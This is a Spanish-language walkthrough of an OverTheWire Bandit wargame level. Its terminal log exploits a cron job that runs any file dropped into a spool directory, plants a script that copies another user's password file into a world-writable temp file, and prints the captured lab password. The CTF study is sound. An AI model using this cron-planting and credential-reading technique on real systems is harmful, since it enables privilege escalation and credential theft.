## Objetivo

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

## Datos de Acceso al Nivel

ssh bandit23@bandit.labs.overthewire.org -p 2220

## Solucion

```
bandit23@bandit:~$ whoami
bandit23
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mktemp -d
/tmp/tmp.bFvLFrHVIf
bandit23@bandit:~$ chmod 777 /tmp/tmp.bFvLFrHVIf
bandit23@bandit:~$ cd /tmp/tmp.bFvLFrHVIf
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.bFvLFrHVIf" > script.sh
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.bFvLFrHVIf
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ touch password
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ chmod 777 password
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:35 .
drwxrwx-wt 4027 root     root     11063296 Sep  4 16:35 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:35 password
-rw-rw-r--    1 bandit23 bandit23       52 Sep  4 16:33 script.sh
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.bFvLFrHVIf/password
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:37 .
drwxrwx-wt 4029 root     root     11063296 Sep  4 16:37 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:35 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 16:36 script.sh
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ date
Wed Sep  4 04:38:38 PM UTC 2024
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ date
Wed Sep  4 04:39:15 PM UTC 2024
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ date
Wed Sep  4 04:40:00 PM UTC 2024
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cat password
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.bFvLFrHVIf/password
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ date
Wed Sep  4 04:42:20 PM UTC 2024
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ date
Wed Sep  4 04:42:52 PM UTC 2024
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ date
Wed Sep  4 04:43:37 PM UTC 2024
bandit23@bandit:/tmp/tmp.bFvLFrHVIf$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
## Notas Adicionales

mktemp -d  -> crea una carpeta temporal

## Referencias